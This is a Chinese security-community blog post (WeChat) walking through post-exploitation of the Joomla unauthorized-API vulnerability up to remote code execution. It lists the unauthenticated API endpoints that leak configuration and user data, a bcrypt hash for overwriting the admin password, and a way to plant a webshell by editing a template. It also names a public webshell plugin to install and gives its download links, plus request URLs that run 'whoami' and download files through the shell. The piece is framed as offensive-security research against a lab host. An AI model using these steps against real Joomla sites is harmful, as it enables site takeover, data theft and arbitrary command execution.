#  Joomla Unauthorized"后"渗透到RCE

Betta  [ 火线Zone ](javascript:void\(0\);)

**火线Zone** ![]()

微信号 huoxian_zone

功能介绍
火线Zone是火线安全平台运营的安全社区，拥有超过20,000名可信白帽安全专家，内容涵盖渗透测试、红蓝对抗等热门主题，旨在研究讨论实战攻防技术，2年内已贡献1300+原创攻防内容，提交了100,000+原创安全漏洞。

____

___发表于_

收录于合集

![](https://gitee.com/fuli009/images/raw/master/public/20230622234617.png)

**前言**

前文已经分析过了Joomla Unauthorized的漏洞成因，总的来说是由于函数array_merge()变量覆盖引起的，未授权的api接口很多。

  

 **Joomla Unauthorized RCE1**

api路径

  * 

    
    
    api/index.php/v1/config/application?public=true

http://joomla.net:8011/api/index.php/v1/config/application?public=true

  

![](https://gitee.com/fuli009/images/raw/master/public/20230622234619.png)

登录mysql写入webshell，有条件限制

  * 通过log写入webshell

  *   *   *   * 

    
    
    数据库的当前用户为ROOT或拥有FILE权限；（FILE权限指的是对服务器主机上文件的访问）明确网站路径general_log参数值为ONgeneral_log_file参数为webshell路径

  * 通过函数outfile写入webshell（该传统方式 **不可行** ）  

Joomla漏洞版本无注入点无法通过注入点和outfile函数写入webshell

  

 **Joomla Unauthorized RCE2** ****

 **  
**

 **进入后台administrator的方法1**  

通过未授权api

  * 

    
    
    api/index.php/v1/users?public=true

![](https://gitee.com/fuli009/images/raw/master/public/20230622234620.png)![](https://gitee.com/fuli009/images/raw/master/public/20230622234621.png)

可读取用户信息，使用社工方式暴力破解登录后台，利用进行RCE

  

 **进入后台administrator的方法2**

  * 修改模板文件

获取mysql权限后执行sql语句或者使用工具修改后端管理员密码或者其他用户密码，joomla有自己的加密算法，所以也没必要破解他们的加密方式，老版本搭建后使用用户的哈希值更换

  * 

    
    
    Toggle Menu->Users-Manage

![]()

  * 

    
    
    123456123456::$2y$10$GauLOsp1NBJLO0FGjlqhxOu8LZe9wconNuPwqgjX/pGxAqn7dL5ba

![](https://gitee.com/fuli009/images/raw/master/public/20230622234622.png)

修改admin的密码为该密码

![](https://gitee.com/fuli009/images/raw/master/public/20230622234623.png)

可登录后台

  

 **后台RCE的两种方式**

![](https://gitee.com/fuli009/images/raw/master/public/20230622234624.png)

  * 

    
    
     Toggle Menu->System->Templates->Site Templates->cassiopeia

![](https://gitee.com/fuli009/images/raw/master/public/20230622234625.png)

修改模板文件,添加恶意代码实现命令执行，获取webshell

![](https://gitee.com/fuli009/images/raw/master/public/20230622234626.png)

测试webshell

![](https://gitee.com/fuli009/images/raw/master/public/20230622234627.png)

  * 导入恶意插件

项目地址

  * 

    
    
    https://github.com/p0dalirius/Joomla-webshell-plugin

路径  

  * 

    
    
    Toggle Menu->System-> Extensions

![](https://gitee.com/fuli009/images/raw/master/public/20230622234628.png)

下载地址

  * 

    
    
    https://github.com/p0dalirius/Joomla-webshell-plugin/releases/tag/1.1

上传下载的恶意插件  

![](https://gitee.com/fuli009/images/raw/master/public/20230622234629.png)

上传成功后查看插件管理

  * 

    
    
    http://joomla.net:8011/administrator/index.php?option=com_installer&view=manage

![](https://gitee.com/fuli009/images/raw/master/public/20230622234631.png)

  

  * 

    
    
    http://joomla.net:8011/modules/mod_webshell/mod_webshell.php?action=exec&cmd=whoami

![](https://gitee.com/fuli009/images/raw/master/public/20230622234632.png)

成功执行命令

当前目录下创建一个1.txt,，文件内容如下

![](https://gitee.com/fuli009/images/raw/master/public/20230622234633.png)

  * 

    
    
    http://joomla.net:8011/modules/mod_webshell/mod_webshell.php?action=download&path=./1.txt

![](https://gitee.com/fuli009/images/raw/master/public/20230622234634.png)

文件内容为

![](https://gitee.com/fuli009/images/raw/master/public/20230622234635.png)

  

参考文章

https://github.com/p0dalirius/Joomla-webshell-plugin

https://vulncheck.com/blog/joomla-for-rce

  

往期推荐

[![]()](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497860&idx=1&sn=4c71ce1396dba6f0880e45d74732c6e2&chksm=eaa970a4dddef9b2eedb3686dcb1b07e25c1bb3904bc6e5f9f349883ff4148013e9c37a0797c&scene=21#wechat_redirect)

[![](https://gitee.com/fuli009/images/raw/master/public/20230622234636.png)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497953&idx=1&sn=0c825a2c7832e8b760ad45a77a1b8359&chksm=eaa970c1dddef9d745224f7fdcf496465ef248e460d520d335fa8b1e8f65899aba6efdc16b86&scene=21#wechat_redirect)

[![](https://gitee.com/fuli009/images/raw/master/public/20230622234638.png)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497941&idx=1&sn=5a222c66d2a456b1c08a5bcbd6700535&chksm=eaa970f5dddef9e3f3d943bb064113b43a3665f76f36b7d26e021eb58ddd8ecad94c80c18ec5&scene=21#wechat_redirect)

  

![]()

火线Zone是火线安全平台运营的安全社区，拥有超过20,000名可信白帽安全专家，内容涵盖渗透测试、红蓝对抗、漏洞分析、代码审计、漏洞复现等热门主题，旨在研究讨论实战攻防技术，助力社区安全专家技术成长，2年内已贡献1300+原创攻防内容，提交了100,000+原创安全漏洞。  

欢迎具备分享和探索精神的你加入火线Zone社区，一起分享技术干货，共建一个有技术氛围的优质安全社区！

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

